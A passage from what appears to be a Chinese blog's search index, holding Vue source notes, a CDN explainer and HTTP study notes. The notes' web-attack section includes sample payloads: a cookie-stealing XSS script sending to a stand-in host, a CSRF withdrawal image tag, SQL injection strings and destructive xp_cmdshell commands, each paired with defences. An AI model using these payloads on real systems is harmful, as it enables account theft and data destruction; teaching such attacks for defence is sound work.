//实例化一个VNode返回。组件的VNode是没有children的  const name = Ctor.options.name || tag  const vnode = new VNode(    `vue-component-$&#123;Ctor.cid&#125;$&#123;name ? `-$&#123;name&#125;` : &#x27;&#x27;&#125;`,    data, undefined, undefined, undefined, context,    &#123; Ctor, propsData, listeners, tag, children &#125;,    asyncFactory  )  if (__WEEX__ &amp;&amp; isRecyclableComponent(vnode)) &#123;    return renderRecyclableComponentTemplate(vnode)  &#125;  return vnode&#125;\n\n稍微提下createComponent生成VNode的三个关键流程：\n\n构造子类构造函数Ctor\ninstallComponentHooks安装组件钩子函数\n实例化 vnode\n\n小结createElement 创建 VNode 的过程，每个 VNode 有 children，children 每个元素也是一个VNode，这样就形成了一个虚拟树结构，用于描述真实的DOM树结构\n","categories":["框架"],"tags":["vue"]},{"title":"CDN内容分发网络","url":"/2018/04/22/http/CDN%E5%86%85%E5%AE%B9%E5%88%86%E5%8F%91%E7%BD%91%E7%BB%9C/","content":"一、是什么CDN (全称 Content Delivery Network)，即内容分发网络\n构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN 的关键技术主要有内容存储和分发技术\n简单来讲，CDN就是根据用户位置分配最近的资源\n于是，用户在上网的时候不用直接访问源站，而是访问离他“最近的”一个 CDN 节点，术语叫边缘节点，其实就是缓存了源站内容的代理服务器。如下图：\n\n二、原理分析在没有应用CDN时，我们使用域名访问某一个站点时的路径为\n\n用户提交域名→浏览器对域名进行解释→DNS 解析得到目的主机的IP地址→根据IP地址访问发出请求→得到请求数据并回复\n\n应用CDN后，DNS 返回的不再是 IP 地址，而是一个CNAME(Canonical Name ) 别名记录，指向CDN的全局负载均衡\nCNAME实际上在域名解析的过程中承担了中间人（或者说代理）的角色，这是CDN实现的关键\n负载均衡系统由于没有返回IP地址，于是本地DNS会向负载均衡系统再发送请求 ，则进入到CDN的全局负载均衡系统进行智能调度：\n\n看用户的 IP 地址，查表得知地理位置，找相对最近的边缘节点\n看用户所在的运营商网络，找相同网络的边缘节点\n检查边缘节点的负载情况，找负载较轻的节点\n其他，比如节点的“健康状况”、服务能力、带宽、响应时间等\n\n结合上面的因素，得到最合适的边缘节点，然后把这个节点返回给用户，用户就能够就近访问CDN的缓存代理\n整体流程如下图：\n\n缓存代理缓存系统是 CDN的另一个关键组成部分，缓存系统会有选择地缓存那些最常用的那些资源\n其中有两个衡量CDN服务质量的指标：\n\n命中率：用户访问的资源恰好在缓存系统里，可以直接返回给用户，命中次数与所有访问次数之比\n回源率：缓存里没有，必须用代理的方式回源站取，回源次数与所有访问次数之比\n\n缓存系统也可以划分出层次，分成一级缓存节点和二级缓存节点。一级缓存配置高一些，直连源站，二级缓存配置低一些，直连用户\n回源的时候二级缓存只找一级缓存，一级缓存没有才回源站，可以有效地减少真正的回源\n现在的商业 CDN命中率都在 90% 以上，相当于把源站的服务能力放大了 10 倍以上\n三、总结CDN 目的是为了改善互联网的服务质量，通俗一点说其实就是提高访问速度\nCDN 构建了全国、全球级别的专网，让用户就近访问专网里的边缘节点，降低了传输延迟，实现了网站加速\n通过CDN的负载均衡系统，智能调度边缘节点提供服务，相当于CDN服务的大脑，而缓存系统相当于CDN的心脏，缓存命中直接返回给用户，否则回源\n","categories":["http"],"tags":["http"]},{"title":"http协议","url":"/2018/04/20/http/1-http/","content":"一 、基础概念1.1 Web 基础\nHTTP（HyperText Transfer Protocol，超文本传输协议）。\nWWW（World Wide Web）的三种技术：HTML、HTTP、URL。\nRFC（Request for Comments，征求修正意见书），互联网的设计文档。\n\n1.2 URL\nURI（Uniform Resource Indentifier&#96;，统一资源标识符）\nURL（Uniform Resource Locator，统一资源定位符）\nURN（Uniform Resource Name，统一资源名称），例如 urn:isbn:0-486-27557-4。\n\n\nURI 包含 URL 和 URN，目前 WEB 只有 URL 比较流行，所以见到的基本都是 URL。\n\n\n1.3 请求和响应报文1.3.1 请求报文\n1.3.2. 响应报文\n二、HTTP 方法\n客户端发送的 请求报文 第一行为请求行，包含了方法字段。\n\n2.1 GET\n获取资源\n\n\n当前网络请求中，绝大部分使用的是 GET 方法。\n\n2.2 HEAD\n获取报文首部\n\n\n和 GET 方法一样，但是不返回报文实体主体部分。\n主要用于确认 URL 的有效性以及资源更新的日期时间等。\n\n2.3 POST\n传输实体主体\n\n\nPOST 主要用来传输数据，而 GET 主要用来获取资源。\n\n2.4 PUT\n上传文件\n\n\n由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。\n\nPUT /new.html HTTP/1.1Host: example.comContent-type: text/htmlContent-length: 16&lt;p&gt;New File&lt;/p&gt;\n\n2.5 PATCH\n对资源进行部分修改\n\n\nPUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。\n\nPATCH /file.txt HTTP/1.1Host: www.example.comContent-Type: application/exampleIf-Match: &quot;e0023aa4e&quot;Content-Length: 100[description of changes]\n\n2.6 DELETE\n删除文件\n\n\n与 PUT 功能相反，并且同样不带验证机制。\n\nDELETE /file.html HTTP/1.1\n\n2.7 OPTIONS\n查询支持的方法\n\n\n查询指定的 URL 能够支持的方法。\n会返回 Allow: GET, POST, HEAD, OPTIONS 这样的内容。\n\n2.8 CONNECT\n要求用隧道协议连接代理\n\n\n要求在与代理服务器通信时建立隧道，使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。\n\nCONNECT www.example.com:443 HTTP/1.1\n\n\n2.9 TRACE\n追踪路径\n\n\n服务器会将通信路径返回给客户端。\n发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。\n通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪），因此更不会去使用它。\n\n三、HTTP 状态码\n服务器返回的 响应报文 中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。\n\n\n\n\n状态码\n类别\n原因短语\n\n\n\n1XX\nInformational（信息性状态码）\n接收的请求正在处理\n\n\n2XX\nSuccess（成功状态码）\n请求正常处理完毕\n\n\n3XX\nRedirection（重定向状态码）\n需要进行附加操作以完成请求\n\n\n4XX\nClient Error（客户端错误状态码）\n服务器无法处理请求\n\n\n5XX\nServer Error（服务器错误状态码）\n服务器处理请求出错\n\n\n3.1 1XX 信息\n100 Continue ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。\n\n3.2 2XX 成功\n200 OK\n204 No Content ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。\n206 Partial Content ：表示客户端进行了范围请求。响应报文包含由 Content-Range 指定范围的实体内容。\n\n3.3 3XX 重定向\n301 Moved Permanently ：永久性重定向\n302 Found ：临时性重定向\n303 See Other ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。\n注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。\n304 Not Modified ：如果请求报文首部包含一些条件，例如：If-Match，If-ModifiedSince，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。\n307 Temporary Redirect ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。\n\n3.4 4XX 客户端错误\n400 Bad Request ：请求报文中存在语法错误。\n401 Unauthorized ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。\n403 Forbidden ：请求被拒绝，服务器端没有必要给出拒绝的详细理由。\n404 Not Found\n\n3.5 5XX 服务器错误\n500 Internal Server Error ：服务器正在执行请求时发生错误。\n503 Service Unavilable ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。\n\n四、HTTP 首部\n有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段\n\n\n各种首部字段及其含义如下（不需要全记，仅供查阅）：\n\n4.1 通用首部字段\n\n\n首部字段名\n说明\n\n\n\nCache-Control\n控制缓存的行为\n\n\nConnection\n控制不再转发给代理的首部字段、管理持久连接\n\n\nDate\n创建报文的日期时间\n\n\nPragma\n报文指令\n\n\nTrailer\n报文末端的首部一览\n\n\nTransfer-Encoding\n指定报文主体的传输编码方式\n\n\nUpgrade\n升级为其他协议\n\n\nVia\n代理服务器的相关信息\n\n\nWarning\n错误通知\n\n\n4.2 请求首部字段\n\n\n首部字段名\n说明\n\n\n\nAccept\n用户代理可处理的媒体类型\n\n\nAccept-Charset\n优先的字符集\n\n\nAccept-Encoding\n优先的内容编码\n\n\nAccept-Language\n优先的语言（自然语言）\n\n\nAuthorization\nWeb 认证信息\n\n\nExpect\n期待服务器的特定行为\n\n\nFrom\n用户的电子邮箱地址\n\n\nHost\n请求资源所在服务器\n\n\nIf-Match\n比较实体标记（ETag）\n\n\nIf-Modified-Since\n比较资源的更新时间\n\n\nIf-None-Match\n比较实体标记（与 If-Match 相反）\n\n\nIf-Range\n资源未更新时发送实体 Byte 的范围请求\n\n\nIf-Unmodified-Since\n比较资源的更新时间（与 If-Modified-Since相反）\n\n\nMax-Forwards\n最大传输逐跳数\n\n\nProxy-Authorization\n代理服务器要求客户端的认证信息\n\n\nRange\n实体的字节范围请求\n\n\nReferer\n对请求中 URI 的原始获取方\n\n\nTE\n传输编码的优先级\n\n\nUser-Agent\nHTTP 客户端程序的信息\n\n\n4.3 响应首部字段\n\n\n首部字段名\n说明\n\n\n\nAccept-Ranges\n是否接受字节范围请求\n\n\nAge\n推算资源创建经过时间\n\n\nETag\n资源的匹配信息\n\n\nLocation\n令客户端重定向至指定 URI\n\n\nProxy-Authenticate\n代理服务器对客户端的认证信息\n\n\nRetry-After\n对再次发起请求的时机要求\n\n\nServer\nHTTP 服务器的安装信息\n\n\nVary\n代理服务器缓存的管理信息\n\n\nWWW-Authenticate\n服务器对客户端的认证信息\n\n\n4.4 实体首部字段\n\n\n首部字段名\n说明\n\n\n\nAllow\n资源可支持的 HTTP方法\n\n\nContent-Encoding\n实体主体适用的编码方式\n\n\nContent-Language\n实体主体的自然语言\n\n\nContent-Length\n实体主体的大小\n\n\nContent-Location\n替代对应资源的 URI\n\n\nContent-MD5\n实体主体的报文摘要\n\n\nContent-Range\n实体主体的位置范围\n\n\nContent-Type\n实体主体的媒体类型\n\n\nExpires\n实体主体过期的日期时间\n\n\nLast-Modified\n资源的最后修改日期时间\n\n\n五、具体应用5.1 Cookie\nHTTP 协议是无状态的，主要是为了让 HTTP 协议尽可能简单，使得它能够处理大量事务。HTTP/1.1 引入 Cookie 来保存状态信息。\nCookie 是服务器发送给客户端的数据，该数据会被保存在浏览器中，并且客户端的下一次请求报文会包含该数据。通过 Cookie 可以让服务器知道两个请求是否来自于同一个客户端，从而实现保持登录状态等功能。\n\n5.1.1 创建过程\n服务器发送的响应报文包含 Set-Cookie 字段，客户端得到响应报文后把 Cookie 内容保存到浏览器中\n\nHTTP/1.0 200 OKContent-type: text/htmlSet-Cookie: yummy_cookie=chocoSet-Cookie: tasty_cookie=strawberry[page content]\n\n\n客户端之后发送请求时，会从浏览器中读出 Cookie 值，在请求报文中包含 Cookie 字段\n\nGET /sample_page.html HTTP/1.1Host: www.example.orgCookie: yummy_cookie=choco; tasty_cookie=strawberry\n\n5.1.2 分类\n会话期 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。\n持久性 Cookie：指定一个特定的过期时间（Expires）或有效期（Max-Age）之后就成为了持久性的 Cookie。\n\nSet-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;\n\n5.1.3 Set-Cookie\n\n\n属性\n说明\n\n\n\nNAME=VALUE\n赋予 Cookie 的名称和其值（必需项）\n\n\nexpires=DATE\nCookie 的有效期（若不明确指定则默认为浏览器关闭前为止）\n\n\npath=PATH\n将服务器上的文件目录作为 Cookie 的适用对象（若不指定则默认为文档所在的文件目录）\n\n\ndomain=域名\n作为 Cookie 适用对象的域名（若不指定则默认为创建 Cookie 的服务器的域名）\n\n\nSecure\n仅在 HTTPs 安全通信时才会发送 Cookie\n\n\nHttpOnly\n加以限制，使 Cookie 不能被 JavaScript 脚本访问\n\n\n5.1.4 Session 和 Cookie 区别\nSession 是服务器用来跟踪用户的一种手段，每个 Session 都有一个唯一标识：Session ID。当服务器创建了一个 Session 时，给客户端发送的响应报文包含了 Set-Cookie 字段，其中有一个名为 sid 的键值对，这个键值对就是 Session ID。客户端收到后就把 Cookie 保存在浏览器中，并且之后发送的请求报文都包含 Session ID。HTTP 就是通过 Session 和 Cookie 这两种方式一起合作来实现跟踪用户状态的，Session 用于服务器端，Cookie 用于客户端。\n\n5.1.5 浏览器禁用 Cookie 的情况\n会使用 URL 重写技术，在 URL 后面加上 sid=xxx 。\n\n5.1.6 使用 Cookie 实现用户名和密码的自动填写\n网站脚本会自动从保存在浏览器中的 Cookie 读取用户名和密码，从而实现自动填写。\n但是如果 Set-Cookie 指定了 HttpOnly属性，就无法通过 Javascript脚本获取 Cookie信息，这是出于安全性考虑。\n\n5.2 缓存5.2.1 优点\n降低服务器的负担；\n提高响应速度（缓存资源比服务器上的资源离客户端更近）\n\n5.2.2 实现方法\n让代理服务器进行缓存\n让客户端浏览器进行缓存\n\n5.2.3 Cache-Control 字段\nHTTP 通过 Cache-Control 首部字段来控制缓存。\n\nCache-Control: private, max-age=0, no-cache\n\n5.2.4 no-cache 指令\n该指令出现在请求报文的 Cache-Control 字段中，表示缓存服务器需要先向原服务器验证缓存资源是否过期\n该指令出现在响应报文的 Cache-Control 字段中，表示缓存服务器在进行缓存之前需要先验证缓存资源的有效性\n\n5.2.5 no-store 指令\n该指令表示缓存服务器不能对请求或响应的任何一部分进行缓存。\nno-cache 不表示不缓存，而是缓存之前需要先进行验证，no-store 才是不进行缓存。\n\n5.2.6 max-age 指令\n该指令出现在请求报文的 Cache-Control 字段中，如果缓存资源的缓存时间小于该指令指定的时间，那么就能接受该缓存。\n该指令出现在响应报文的 Cache-Control 字段中，表示缓存资源在缓存服务器中保存的时间。\nExpires 字段也可以用于告知缓存服务器该资源什么时候会过期。在 HTTP/1.1中，会优先处理 Cache-Control : max-age 指令；而在 HTTP/1.0 中，Cache-Control : max-age 指令会被忽略掉。\n\n5.3 持久连接\n当浏览器访问一个包含多张图片的 HTML 页面时，除了请求访问 HTML 页面资源，还会请求图片资源，如果每进行一次 HTTP 通信就要断开一次 TCP 连接，连接建立和断开的开销会很大。持久连接只需要建立一次 TCP 连接就能进行多次 HTTP 通信。\n\n\n\n持久连接需要使用 Connection 首部字段进行管理。HTTP/1.1 开始 HTTP 默认是持久化连接的，如果要断开 TCP 连接，需要由客户端或者服务器端提出断开，使用 Connection : close；而在 HTTP/1.1 之前默认是非持久化连接的，如果要维持持续连接，需要使用 Connection : Keep-Alive。\n\n5.4 管线化处理\nHTTP/1.1 支持管线化处理，可以同时发送多个请求和响应，而不需要发送一个请求然后等待响应之后再发下一个请求。\n\n5.5 编码\n编码（Encoding）主要是为了对实体进行压缩。常用的编码有：gzip、compress、deflate、identity，其中 identity 表示不执行压缩的编码格式。\n\n5.6 分块传输编码\nChunked Transfer Coding，可以把数据分割成多块，让浏览器逐步显示页面。\n\n5.7 多部分对象集合\n一份报文主体内可含有多种类型的实体同时发送，每个部分之间用 boundary 字段定义的分隔符进行分隔，每个部分都可以有首部字段。\n\n例如，上传多个表单时可以使用如下方式：\nContent-Type: multipart/form-data; boundary=AaB03x--AaB03xContent-Disposition: form-data; name=&quot;submit-name&quot;Larry--AaB03xContent-Disposition: form-data; name=&quot;files&quot;; filename=&quot;file1.txt&quot;Content-Type: text/plain... contents of file1.txt ...--AaB03x--\n\n5.8 范围请求\n如果网络出现中断，服务器只发送了一部分数据，范围请求使得客户端能够只请求未发送的那部分数据，从而避免服务器端重新发送所有数据。\n在请求报文首部中添加 Range 字段指定请求的范围，请求成功的话服务器发送 206 Partial Content 状态。\n\nGET /z4d4kWk.jpg HTTP/1.1Host: i.imgur.comRange: bytes=0-1023HTTP/1.1 206 Partial ContentContent-Range: bytes 0-1023/146515Content-Length: 1024...(binary content)\n\n5.9 内容协商\n通过内容协商返回最合适的内容，例如根据浏览器的默认语言选择返回中文界面还是英文界面。\n涉及以下首部字段：Accept、Accept-Charset、Accept-Encoding、Accept-Language、Content-Language。\n\n5.10 虚拟主机\nHTTP/1.1 使用虚拟主机技术，使得一台服务器拥有多个域名，并且在逻辑上可以看成多个服务器。\n使用 Host 首部字段进行处理。\n\n5.11 通信数据转发5.11.1 代理\n代理服务器接受客户端的请求，并且转发给其它服务器。\n使用代理的主要目的是：缓存、网络访问控制以及访问日志记录。\n代理服务器分为正向代理和反向代理两种，用户察觉得到正向代理的存在，而反向代理一般位于内部网络中，用户察觉不到。\n\n\n2. 网关\n与代理服务器不同的是，网关服务器会将 HTTP - 转化为其它协议进行通信，从而请求其它非 HTTP服务器的服务。\n\n3. 隧道\n使用 SSL 等加密手段，为客户端和服务器之间建立一条安全的通信线路。隧道本身不去解析 HTTP 请求。\n\n六、HTTPs\nHTTP 有以下安全性问题：\n\n\n使用明文进行通信，内容可能会被窃听；\n不验证通信方的身份，通信方的身份有可能遭遇伪装；\n无法证明报文的完整性，报文有可能遭篡改。\n\n\nHTTPs 并不是新协议，而是 HTTP 先和 SSL（Secure Sockets Layer）通信，再由 SSL 和 TCP 通信。也就是说 HTTPs 使用了隧道进行通信。\n\n\n通过使用 SSL，HTTPs 具有了加密、认证和完整性保护。\n\n\n6.1 加密6.1.1 对称密钥加密\n对称密钥加密（Symmetric-Key Encryption），加密的加密和解密使用同一密钥。\n\n\n优点：运算速度快；\n缺点：密钥容易被获取。\n\n\n6.1.2 公开密钥加密\n公开密钥加密（Public-Key Encryption），也称为非对称密钥加密，使用一对密钥用于加密和解密，分别为公开密钥和私有密钥。公开密钥所有人都可以获得，通信发送方获得接收方的公开密钥之后，就可以使用公开密钥进行加密，接收方收到通信内容后使用私有密钥解密。\n\n\n优点：更为安全；\n缺点：运算速度慢；\n\n6.1.3 HTTPs 采用的加密方式\nHTTPs 采用混合的加密机制，使用公开密钥加密用于传输对称密钥，之后使用对称密钥加密进行通信。（下图中的 Session Key就是对称密钥）\n\n6.2 认证\n通过使用 证书 来对通信方进行认证。\n\n\n数字证书认证机构（CA，Certificate Authority）是客户端与服务器双方都可信赖的第三方机构。服务器的运营人员向 CA 提出公开密钥的申请，CA 在判明提出申请者的身份之后，会对已申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将该公开密钥放入公开密钥证书后绑定在一起。\n\n\n进行HTTPs 通信时，服务器会把证书发送给客户端，客户端取得其中的公开密钥之后，先进行验证，如果验证通过，就可以开始通信。\n使用 OpenSSL 这套开源程序，每个人都可以构建一套属于自己的认证机构，从而自己给自己颁发服务器证书。浏览器在访问该服务器时，会显示“无法确认连接安全性”或“该网站的安全证书存在问题”等警告消息。\n\n6.3 完整性\nSSL 提供报文摘要功能来验证完整性。\n\n七、Web 攻击技术7.1 攻击模式7.1.1 主动攻击\n直接攻击服务器，具有代表性的有 SQL 注入和 OS 命令注入。\n\n7.1.2 被动攻击\n设下圈套，让用户发送有攻击代码的 HTTP 请求，用户会泄露 Cookie 等个人信息，具有代表性的有跨站脚本攻击和跨站请求伪造。\n\n7.2 跨站脚本攻击7.2.1 概念\n跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和 Cookie 等各种内容。\n\n例如有一个论坛网站，攻击者可以在上面发表以下内容：\n&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;\n\n之后该内容可能会被渲染成以下形式：\n&lt;p&gt;&lt;script&gt;location.href=&quot;//domain.com/?c=&quot; + document.cookie&lt;/script&gt;&lt;/p&gt;\n\n\n另一个用户浏览了含有这个内容的页面将会跳往 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。\n\n7.2.2 危害\n伪造虚假的输入表单骗取个人信息\n窃取用户的 Cookie 值\n显示伪造的文章或者图片\n\n7.2.3 防范手段过滤特殊字符\n许多语言都提供了对 HTML 的过滤：\n\nPHP 的 htmlentities() 或是 htmlspecialchars()。\nPython 的 cgi.escape()。\nJava 的 xssprotect (Open Source Library)。\nNode.js 的 node-validator。\n\n指定 HTTP 的 Content-Type\n通过这种方式，可以避免内容被当成 HTML 解析，比如 PHP 语言可以使用以下代码：\n&lt;?php   header(&#x27;Content-Type: text/javascript; charset=utf-8&#x27;);?&gt;\n\n7.3 跨站点请求伪造7.3.1 概念\n跨站点请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了 Web 中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。\n\n\nXSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。\n\n假如一家银行用以执行转账操作的 URL 地址如下：\nhttp://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeName。\n\n那么，一个恶意攻击者可以在另一个网站上放置如下代码：\n&lt;img src=&quot;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&quot;&gt;。\n\n\n如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 资金。\n这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有受攻击的危险。\n透过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。\n\n7.3.2 防范手段检查 Referer 字段\n\nHTTP 头中有一个 Referer 字段，这个字段用以标明请求来源于哪个地址。在处理敏感数据请求时，通常来说，Referer 字段应和请求的地址位于同一域名下。\n这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。\n\n添加校验 Token\n\n由于 CSRF 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法再执行 CSRF 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求时，这个伪乱数也一并提交上去以供校验。正常的访问时，客户端浏览器能够正确得到并传回这个伪乱数，而通过 CSRF 传来的欺骗性攻击中，攻击者无从事先得知这个伪乱数的值，服务器端就会因为校验 Token 的值为空或者错误，拒绝这个可疑请求。\n\n7.4 SQL 注入攻击7.4.1 概念服务器上的数据库运行非法的 SQL 语句。\n7.4.2 攻击原理例如一个网站登录验证的 SQL 查询代码为：\nstrSQL = &quot;SELECT * FROM users WHERE (name = &#x27;&quot; + userName + &quot;&#x27;) and (pw = &#x27;&quot;+ passWord +&quot;&#x27;);&quot;\n\n如果填入以下内容：\nuserName = &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;;passWord = &quot;1&#x27; OR &#x27;1&#x27;=&#x27;1&quot;;\n\n那么 SQL 查询字符串为：\nstrSQL = &quot;SELECT * FROM users WHERE (name = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;) and (pw = &#x27;1&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;);&quot;\n\n此时无需验证通过就能执行以下查询：\nstrSQL = &quot;SELECT * FROM users;&quot;\n\n7.4.3 危害\n数据表中的数据外泄，例如个人机密数据，账户数据，密码等。\n数据结构被黑客探知，得以做进一步攻击（例如 SELECT * FROM sys.tables）。\n数据库服务器被攻击，系统管理员账户被窜改（例如 ALTER LOGIN sa WITH PASSWORD&#x3D;’xxxxxx’）。\n获取系统较高权限后，有可能得以在网页加入恶意链接、恶意代码以及 XSS 等。\n经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统（例如 xp_cmdshell “net stop iisadmin” 可停止服务器的 IIS 服务）。\n破坏硬盘数据，瘫痪全系统（例如 xp_cmdshell “FORMAT C:”）。\n\n7.4.4 防范手段\n在设计应用程序时，完全使用参数化查询（Parameterized Query）来设计数据访问功能。\n在组合 SQL 字符串时，先针对所传入的参数作字符取代（将单引号字符取代为连续 2 个单引号字符）。\n如果使用 PHP 开发网页程序的话，亦可打开 PHP 的魔术引号（Magic quote）功能（自动将所有的网页传入参数，将单引号字符取代为连续 2 个单引号字符）。\n其他，使用其他更安全的方式连接 SQL 数据库。例如已修正过 SQL 注入问题的数据库连接组件，例如 ASP.NET 的 SqlDataSource 对象或是 LINQ to SQL。\n使用 SQL 防注入系统。\n\n7.5 拒绝服务攻击7.5.1 概念\n拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。\n分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用网络上两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。\n\n\n维基百科：拒绝服务攻击\n\n八、GET 和 POST 的区别8.1 参数\nGET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在内容实体中。\nGET 的传参方式相比于 POST 安全性较差，因为 GET 传的参数在 URL 中是可见的，可能会泄露私密信息。并且 GET 只支持 ASCII 字符，如果参数为中文则可能会出现乱码，而 POST 支持标准字符集。\n\nGET /test/demo_form.asp?name1=value1&amp;name2=value2 HTTP/1.1POST /test/demo_form.asp HTTP/1.1Host: w3schools.comname1=value1&amp;name2=value2\n\n8.2 安全\n安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。\nGET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。\n安全的方法除了 GET 之外还有：HEAD、OPTIONS。\n不安全的方法除了 POST 之外还有 PUT、DELETE。\n\n8.3 幂等性\n幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。所有的安全方法也都是幂等的。\nGET /pageX HTTP/1.1 是幂等的。连续调用多次，客户端接收到的结果都是一样的：\n\nGET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1GET /pageX HTTP/1.1\n\n\nPOST /add_row HTTP/1.1 不是幂等的。如果调用多次，就会增加多行记录：\n\nPOST /add_row HTTP/1.1POST /add_row HTTP/1.1   -&gt; Adds a 2nd rowPOST /add_row HTTP/1.1   -&gt; Adds a 3rd row\n\n\nDELETE /idX/delete HTTP/1.1 是幂等的，即便是不同请求之间接收到的状态码不一样：\n\nDELETE /idX/delete HTTP/1.1   -&gt; Returns 200 if idX existsDELETE /idX/delete HTTP/1.1   -&gt; Returns 404 as it just got deletedDELETE /idX/delete HTTP/1.1   -&gt; Returns 404\n\n8.4 可缓存\n如果要对响应进行缓存，需要满足以下条件：\n\n\n请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。\n响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300,301, 404, 405, 410, 414, and 501。\n响应报文的 Cache-Control 首部字段没有指定不进行缓存。\n\n8.5 XMLHttpRequest\n为了阐述 POST 和 GET 的另一个区别，需要先了解 XMLHttpRequest：\n\n\nXMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。\n\n\n在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。\n\n九、各版本比较9.1 HTTP&#x2F;1.0 与 HTTP&#x2F;1.1 的区别\nHTTP/1.1 默认是持久连接\nHTTP/1.1 支持管线化处理\nHTTP/1.1 支持虚拟主机\nHTTP/1.1 新增状态码 100\nHTTP/1.1 只是分块传输编码\nHTTP/1.1 新增缓存处理指令 max-age\n\n9.2 HTTP&#x2F;1.1 与 HTTP&#x2F;2.0 的区别9.2.1 多路复用\nHTTP/2.0 使用多路复用技术，使用同一个 TCP 连接来处理多个请求\n\n9.2.2 首部压缩\nHTTP&#x2F;1.1 的首部带有大量信息，而且每次都要重复发送。HTTP&#x2F;2.0 要求通讯双方各自缓存一份首部字段表，从而避免了重复传输。\n\n9.2.3 